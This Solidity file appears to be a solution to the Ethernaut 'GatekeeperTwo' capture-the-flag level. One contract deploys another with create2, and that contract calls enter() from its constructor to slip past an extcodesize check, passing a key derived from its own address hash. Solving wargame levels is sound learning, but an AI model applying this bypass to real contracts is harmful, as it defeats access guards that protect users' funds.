pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}


contract FixedAttacker {
    constructor(address instanceAddress) {
        // Deploy ContractTwo using create2 with appropriate salt
        bytes32 salt = keccak256(abi.encodePacked(instanceAddress, block.timestamp));
        bytes memory bytecode = type(FixedContractTwo).creationCode;
        bytes memory args = abi.encode(instanceAddress);
        bytes memory fullCreationData = abi.encodePacked(bytecode, args);
        assembly {
            pop(create2(0, add(fullCreationData, 0x20), mload(fullCreationData), salt))
        }
    }
}

contract FixedContractTwo {
    constructor(address instanceAddress) {
        // Gate One: msg.sender is contract (satisfied)
        // Gate Two: During creation, extcodesize is 0 (satisfied)
        
        // Gate Three: Correct key calculation
        address self = address(this);
        bytes32 hash = keccak256(abi.encodePacked(self));
        uint64 gateValue = uint64(bytes8(hash)); // First 8 bytes
        uint64 gateKey = gateValue ^ type(uint64).max;
        
        require(gateValue ^ gateKey == type(uint64).max, "Key calculation failed");
        IGatekeeperTwo(instanceAddress).enter(bytes8(gateKey));
    }
}